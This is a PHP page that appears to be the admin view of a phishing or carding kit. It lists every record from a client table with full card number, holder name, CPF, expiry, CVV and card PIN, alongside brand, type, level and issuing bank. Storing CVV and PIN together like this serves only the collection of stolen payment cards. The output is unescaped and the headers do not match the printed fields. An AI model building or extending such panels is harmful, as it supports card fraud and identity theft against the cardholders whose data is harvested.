<?php
include "../config/config.php";

global $pdo;
$array=[];
$sql=$pdo->prepare("SELECT * FROM coderphp_cliente");
$sql->execute();

if($sql->rowCount() > 0){
  $array = $sql->fetchAll();
}


?>

<div class="content " >

<table class="table table-dark">
  <thead>
<tr>
       <th scope="row">#ID</th>
      <td>CC</td>
      <td>TÍTULAR</td>
      <td>CPF</td>
     
      <td>VALIDADE</td>
      <td>CVV</td>
      <td>SENHA CARD</td>
      <td>BANDEIRA</td>
      <td>CRÉDITO OU DÉBITO</td>
      <td>NÍVEL DA CC</td>
      <td>BANCO EMISSOR</td>
      
     
      
    
     
    </tr>

    
  </thead>
<tbody>


      <?php 
      foreach($array as $cc):
        ?>
        <tr>
          <th scope="col"><?= $cc['id'] ?></th>
          
          
          <th scope="col"><?= $cc['cc'] ?></th>
          <th scope="col"><?= $cc['nome'] ?></th>
           <th scope="col"><?= $cc['cpfcc'] ?></th>
          <th scope="col"><?= $cc['mes'] ?>/<?= $cc['ano'] ?></th>


       
         
         
         
          <th scope="col"><?= $cc['cvv'] ?> </th>
          <th scope="col"><?= $cc['senhacard'] ?> </th>
          
          <th scope="col"><?= $cc['banco'] ?> </th>
          
           <th scope="col"><?= $cc['tipocc'] ?> </th>
          >
          <th scope="col"><?= $cc['categoria'] ?> </th>
            <th scope="col"><?= $cc['tipocc1'] ?> </th>
        
          
          
         


        </tr>

      <?php endforeach; ?>

    </tbody>
</table>




</div>







</form>
</div>
</div>
</div>
</div>


<script type="text/javascript">
  $(function () {
    $('[data-toggle="tooltip"]').tooltip()
  })
</script>


</div>
</div>
</div>
</div>

</div>






</div>
</div>











</div>



</div>


</div>
</div>

</div>